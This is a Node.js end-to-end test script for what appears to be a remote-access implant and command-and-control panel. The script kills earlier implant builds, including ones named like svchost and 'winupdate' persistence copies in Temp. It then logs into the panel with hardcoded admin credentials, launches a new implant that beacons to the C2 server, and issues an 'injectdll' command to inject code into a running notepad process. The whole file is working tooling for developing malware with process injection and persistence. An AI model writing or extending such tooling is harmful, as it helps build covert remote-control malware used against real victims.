/**
 * End-to-end: kill old implants, start fresh build, injectdll into notepad
 */
const { spawn, execSync } = require('child_process');
const path = require('path');
const fs = require('fs');
const http = require('http');

const ROOT = path.join(__dirname, '..');
const HOST = '127.0.0.1';
const PORT = 5000;
const BUILD_ID = 'mv0ter9s_24e61703';
const EXE = path.join(ROOT, 'builds', BUILD_ID, 'inject_fixed.exe');

function post(pathname, body) {
  return new Promise((resolve, reject) => {
    const data = JSON.stringify(body);
    const req = http.request(
      {
        hostname: HOST,
        port: PORT,
        path: pathname,
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(data),
        },
      },
      (res) => {
        let raw = '';
        res.on('data', (c) => (raw += c));
        res.on('end', () => {
          try {
            resolve({ status: res.statusCode, data: JSON.parse(raw || '{}') });
          } catch {
            resolve({ status: res.statusCode, data: raw });
          }
        });
      }
    );
    req.on('error', reject);
    req.write(data);
    req.end();
  });
}

function get(pathname, token) {
  return new Promise((resolve, reject) => {
    const req = http.request(
      {
        hostname: HOST,
        port: PORT,
        path: pathname,
        method: 'GET',
        headers: token ? { Authorization: `Bearer ${token}` } : {},
      },
      (res) => {
        let raw = '';
        res.on('data', (c) => (raw += c));
        res.on('end', () => {
          try {
            resolve({ status: res.statusCode, data: JSON.parse(raw || '{}') });
          } catch {
            resolve({ status: res.statusCode, data: raw });
          }
        });
      }
    );
    req.on('error', reject);
    req.end();
  });
}

function sleep(ms) {
  return new Promise((r) => setTimeout(r, ms));
}

function killImplants() {
  const names = [
    'inject_selftest.exe',
    'implant_windows_amd64.exe',
    'svchost_test.exe',
    'svchost_exe.exe',
    'test_injection_final.exe',
    'lastfinalversion2_updated.exe',
    'lastfinalversion2_test.exe',
    'lastfinalversion2.exe',
    'lastfinalversion2_local.exe',
  ];
  for (const n of names) {
    try {
      execSync(`taskkill /IM ${n} /F`, { stdio: 'ignore' });
    } catch (_) {}
  }
  // temp persistence copies
  try {
    execSync(
      `powershell -NoProfile -Command "Get-Process | Where-Object { $_.Path -like '*\\\\Temp\\\\winupdate*' } | Stop-Process -Force"`,
      { stdio: 'ignore' }
    );
  } catch (_) {}
}

async function login() {
  const r = await post('/api/login', { username: 'admin', password: 'admin123' });
  if (!r.data?.token) throw new Error('No token: ' + JSON.stringify(r.data));
  return r.data.token;
}

async function listClients(token) {
  const res = await get('/api/clients', token);
  const list = res?.data?.clients || res?.data || [];
  return Array.isArray(list) ? list : [];
}

async function main() {
  if (!fs.existsSync(EXE)) throw new Error('Missing ' + EXE);

  console.log('[0] Killing old implants / notepad...');
  killImplants();
  try {
    execSync('taskkill /IM notepad.exe /F', { stdio: 'ignore' });
  } catch (_) {}
  await sleep(2500);

  const token = await login();
  const before = await listClients(token);
  console.log('[0] clients before launch:', before.length, before.map((c) => c.id?.slice(0, 8)));

  console.log('[1] Start notepad...');
  spawn('notepad.exe', [], { detached: true, stdio: 'ignore' }).unref();
  await sleep(1500);
  const task = execSync('tasklist /FI "IMAGENAME eq notepad.exe" /FO CSV /NH', { encoding: 'utf8' });
  const line = task.split(/\r?\n/).filter(Boolean)[0];
  const notepadPid = Number((line.split('","')[1] || '').replace(/"/g, ''));
  if (!notepadPid) throw new Error('notepad PID missing');
  console.log('[2] notepad PID', notepadPid);

  const io = require(path.join(ROOT, 'client', 'node_modules', 'socket.io-client'));
  const socket = io(`http://${HOST}:${PORT}`, {
    auth: { token },
    extraHeaders: { Authorization: `Bearer ${token}` },
    transports: ['websocket'],
  });
  await new Promise((resolve, reject) => {
    socket.on('connect', resolve);
    socket.on('connect_error', reject);
    setTimeout(() => reject(new Error('socket timeout')), 10000);
  });

  const beforeIds = new Set(before.map((c) => c.id));
  console.log('[3] Launch NEW implant', EXE);
  const child = spawn(EXE, [], {
    detached: true,
    stdio: 'ignore',
    windowsHide: true,
    env: { ...process.env, C2_HOST: '127.0.0.1', C2_PORT: '2026' },
  });
  child.unref();
  console.log('[3] spawn pid', child.pid);

  let clientId = null;
  for (let i = 0; i < 45; i++) {
    await sleep(1000);
    const list = await listClients(token);
    const fresh = list.filter((c) => !beforeIds.has(c.id) && (c.active === true || c.active === 1 || c.status === 'online'));
    const anyFresh = list.filter((c) => !beforeIds.has(c.id));
    const pick = fresh[0] || anyFresh[0];
    if (pick) {
      clientId = pick.id;
      console.log(`[4] NEW client after ${i + 1}s:`, clientId, pick.hostname, 'active=', pick.active);
      break;
    }
    // fallback: if all old gone and one active remains, use it
    if (list.length === 1 && (list[0].active === true || list[0].active === 1)) {
      clientId = list[0].id;
      console.log(`[4] single client after ${i + 1}s:`, clientId);
      break;
    }
    process.stdout.write('.');
  }
  console.log('');
  if (!clientId) throw new Error('Fresh implant did not connect (lock/exit?)');

  await sleep(3000); // let auto-setpersistence chatter settle

  const cmd = `injectdll ${notepadPid} ${EXE}`;
  console.log('[5] injectdll:', cmd);
  const result = await new Promise((resolve) => {
    const t = setTimeout(() => resolve('TIMEOUT'), 90000);
    const onResp = (data) => {
      if (data?.clientId && data.clientId !== clientId) return;
      const text = String(data?.response || '');
      if (!text) return;
      const interesting =
        /inject|WinExec|SUCCESS|FAILED|LoadLibrary|VirtualAlloc|CreateRemoteThread|Invalid command|Usage: inject|File not found|Failed to open/i.test(
          text
        );
      console.log('[resp candidate]', text.slice(0, 200).replace(/\n/g, ' | '));
      if (!interesting) return;
      clearTimeout(t);
      socket.off('commandResponse', onResp);
      resolve(text);
    };
    socket.on('commandResponse', onResp);
    socket.emit('executeCommand', { clientId, command: cmd });
  });

  console.log('\n========== INJECT RESULT ==========');
  console.log(result);
  console.log('===================================\n');

  try {
    execSync(`taskkill /PID ${notepadPid} /F`, { stdio: 'ignore' });
  } catch (_) {}

  if (/Invalid command or argument/i.test(result)) {
    console.error('FAIL: still not recognized');
    process.exit(2);
  }
  if (/TIMEOUT/i.test(result)) {
    console.error('FAIL: timeout');
    process.exit(3);
  }
  console.log('PASS: injectdll handled');
  process.exit(0);
}

main().catch((e) => {
  console.error('E2E failed:', e.message || e);
  process.exit(1);
});
